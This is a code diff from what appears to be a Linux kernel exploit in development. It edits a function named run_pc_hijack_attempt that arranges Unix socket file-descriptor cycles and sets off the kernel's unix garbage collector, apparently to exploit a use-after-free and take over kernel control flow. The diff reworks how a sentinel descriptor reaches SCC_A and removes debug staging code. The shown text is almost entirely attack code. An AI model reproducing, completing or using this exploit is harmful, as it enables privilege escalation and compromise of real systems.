@@ -4865,13 +4865,11 @@ static void run_pc_hijack_attempt(uint64_t kbase,
 	int *prepared_reclaim_fds;
 	int filler[2];
 	int trigger_pressure[2];
-	int init_cycle[2];
 	int stall_sock[2];
 	int stall_pipe[2];
 	int init_done[2];
 	int signal1[2];
 	int marker[2];
-	int init_special[2];
 	int old_special[3];
 	int filler_fds[SCM_FD_COUNT];
 	int barrier_sender;
@@ -4958,7 +4956,6 @@ static void run_pc_hijack_attempt(uint64_t kbase,
 	stage_client = bb[1];
 	if (make_unix_socketpair(filler) ||
 	    make_unix_socketpair(trigger_pressure) ||
-	    make_unix_socketpair(init_cycle) ||
 	    make_unix_socketpair(stall_sock) ||
 	    pipe2(stall_pipe, O_CLOEXEC) ||
 	    pipe2(init_done, O_CLOEXEC) ||
@@ -5027,7 +5024,8 @@ static void run_pc_hijack_attempt(uint64_t kbase,
 		die("pc-hijack send SCC_A self-loop");
 	old_special[0] = signal1[1];
 	old_special[1] = stall_pipe[1];
-	if (send_fds(ab[1], old_special, 2, 'S') != 0)
+	old_special[2] = init_done[1];
+	if (send_fds(ab[1], old_special, 3, 'S') != 0)
 		die("pc-hijack send signals to A");
 	if (send_repeated_fd(bb[0], bb[1], 1, 'X') != 0)
 		die("pc-hijack send X->X");
@@ -5036,6 +5034,7 @@ static void run_pc_hijack_attempt(uint64_t kbase,
 	drain_anchored_vertex_messages(&b_vertex);
 	close(stall_pipe[1]);
 	close(signal1[1]);
+	close(init_done[1]);
 	close(ab[0]);
 
 	printf("[D] graph edges done\n"); fflush(stdout);
@@ -5077,30 +5076,8 @@ static void run_pc_hijack_attempt(uint64_t kbase,
 	/* Fix #25 v2: do NOT close bb[0] — keep SCC_B alive. */
 	close(marker[1]);
 
-	init_special[0] = init_cycle[0];
-	init_special[1] = init_done[1];
-	if (send_fds(init_cycle[1], init_special,
-		     ARRAY_SIZE(init_special), 'I') != 0)
-		die("pc-hijack initial GC sentinel");
-	close(init_done[1]);
-	close(init_cycle[0]);
-	printf("[D] pre-sentinel: ab[1]=%d bb[1]=%d filler0=%d filler1=%d"
-	       " tp0=%d tp1=%d stall0=%d sig0=%d"
-	       " ic0=%d ic1=%d id0=%d\n",
-	       ab[1], bb[1], filler[0], filler[1],
-	       trigger_pressure[0], trigger_pressure[1],
-	       stall_sock[0], signal1[0],
-	       init_cycle[0], init_cycle[1], init_done[0]);
-	fflush(stdout);
-	printf("[D] closing init_cycle[1] (fd=%d) — should trigger unix_gc\n",
-	       init_cycle[1]);
-	fflush(stdout);
-	close(init_cycle[1]);
-	usleep(500000);
-	printf("[D] after 500ms: signal1_hup=%d init_done_hup=%d\n",
-	       wait_pipe_hup(signal1[0], 0) == 0,
-	       wait_pipe_hup(init_done[0], 0) == 0);
-	fflush(stdout);
+	/* init_done[1] rides on SCC_A (sent via ab[1] above).
+	   trigger_gc_once → __unix_gc collects SCC_A → fput(init_done[1]) → POLLHUP. */
 	trigger_gc_once();
 	if (wait_pipe_hup(init_done[0], STAGE1_TIMEOUT_MSEC) != 0) {
 		printf("[D] FAILED: signal1_hup=%d\n",
